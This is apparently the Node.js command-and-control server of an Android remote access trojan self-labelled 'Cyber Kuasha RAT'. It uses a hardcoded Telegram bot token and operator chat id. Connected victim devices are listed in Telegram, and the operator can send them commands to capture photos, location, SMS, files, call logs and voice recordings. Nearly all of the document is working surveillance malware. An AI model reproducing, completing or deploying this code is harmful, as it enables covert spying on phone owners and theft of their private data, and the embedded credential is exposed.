const express = require('express');
const webSocket = require('ws');
const http = require('http');
const telegramBot = require('node-telegram-bot-api');
const uuid4 = require('uuid');
const bodyParser = require('body-parser');

// কনফিগারেশন
const token = '8310874884:AAF6sPoGF89am0LuTHbgcd0-BuUnGqd5jjk'; 
const id = '7608303601';
const DEVELOPER_NAME = "𝘾𝙮𝙗𝙚𝙧 𝙆𝙪𝙖𝙨𝙝𝙖";

const app = express();
const appServer = http.createServer(app);
const appSocket = new webSocket.Server({ server: appServer });
const appBot = new telegramBot(token, { polling: true });
const appClients = new Map();

app.use(bodyParser.json());

app.get('/', (req, res) => res.send(`<h1 align="center">𝙎𝙚𝙧𝙫𝙚𝙧 𝙇𝙞𝙫𝙚 𝙗𝙮 ${DEVELOPER_NAME}</h1>`));

// সকেট কানেকশন হ্যান্ডলিং
appSocket.on('connection', (ws, req) => {
    const uuid = uuid4.v4();
    const model = req.headers.model || "Unknown Device";
    ws.uuid = uuid;
    appClients.set(uuid, { ws, model });
    
    appBot.sendMessage(id, `°• 𝙉𝙚𝙬 𝘿𝙚𝙫𝙞𝙘𝙚: <b>${model}</b> 𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙!`, { parse_mode: "HTML" });
    
    ws.on('close', () => {
        appBot.sendMessage(id, `°• 𝘿𝙚𝙫𝙞𝙘𝙚: <b>${model}</b> 𝘿𝙞𝙨𝙘𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙`, { parse_mode: "HTML" });
        appClients.delete(uuid);
    });

    // এরর হ্যান্ডলিং যাতে সার্ভার ক্র্যাশ না করে
    ws.on('error', (error) => {
        console.log("Socket Error: ", error.message);
    });
});

// বটের মেসেজ হ্যান্ডলিং
appBot.on('message', (message) => {
    const chatId = message.chat.id;
    if (chatId == id) {
        if (message.text == '/start') {
            appBot.sendMessage(id, `°• 𝙒𝙚𝙡𝙘𝙤𝙢𝙚 𝙩𝙤 ${DEVELOPER_NAME} 𝙍𝘼𝙏`, {
                parse_mode: "HTML",
                reply_markup: {
                    keyboard: [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"]],
                    resize_keyboard: true
                }
            });
        }

        if (message.text == '𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨') {
            if (appClients.size == 0) return appBot.sendMessage(id, "°• 𝙉𝙤 𝙙𝙚𝙫𝙞𝙘𝙚𝙨 𝙤𝙣𝙡𝙞𝙣𝙚");
            appClients.forEach((value, key) => {
                appBot.sendMessage(id, `• ᴍᴏᴅᴇʟ : <b>${value.model}</b>`, {
                    parse_mode: "HTML",
                    reply_markup: {
                        inline_keyboard: [[{ text: "🎮 Execute Commands", callback_data: key }]]
                    }
                });
            });
        }
    }
});

// কমান্ড একজিকিউশন
appBot.on('callback_query', (query) => {
    const data = query.data;
    if (appClients.has(data)) {
        const client = appClients.get(data);
        appBot.sendMessage(id, `°• 𝘾𝙤𝙢𝙢𝙖𝙣𝙙𝙨 𝙛𝙤𝙧 <b>${client.model}</b>`, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [
                    [{ text: "📸 Photo", callback_data: `camera_${data}` }, { text: "📍 Location", callback_data: `location_${data}` }],
                    [{ text: "📩 SMS", callback_data: `sms_${data}` }, { text: "📂 Files", callback_data: `files_${data}` }],
                    [{ text: "📞 Calls", callback_data: `calls_${data}` }, { text: "🎙️ Voice", callback_data: `voice_${data}` }]
                ]
            }
        });
    } else if (data.includes('_')) {
        const [cmd, devId] = data.split('_');
        const client = appClients.get(devId);
        if (client && client.ws.readyState === webSocket.OPEN) {
            client.ws.send(cmd);
            appBot.answerCallbackQuery(query.id, { text: "Command Sent: " + cmd });
        } else {
            appBot.answerCallbackQuery(query.id, { text: "Device Disconnected!" });
        }
    }
});

// সার্ভার লিসেনিং এবং টাইমআউট সেটিংস (মেইন চেঞ্জ এখানে)
const PORT = process.env.PORT || 8999;
appServer.listen(PORT, "0.0.0.0", () => {
    console.log(`Server is running on port ${PORT}`);
});

// কানেকশন বেশিক্ষণ ধরে রাখার জন্য টাইমআউট বাড়ানো হলো
appServer.keepAliveTimeout = 600000; 
appServer.headersTimeout = 601000;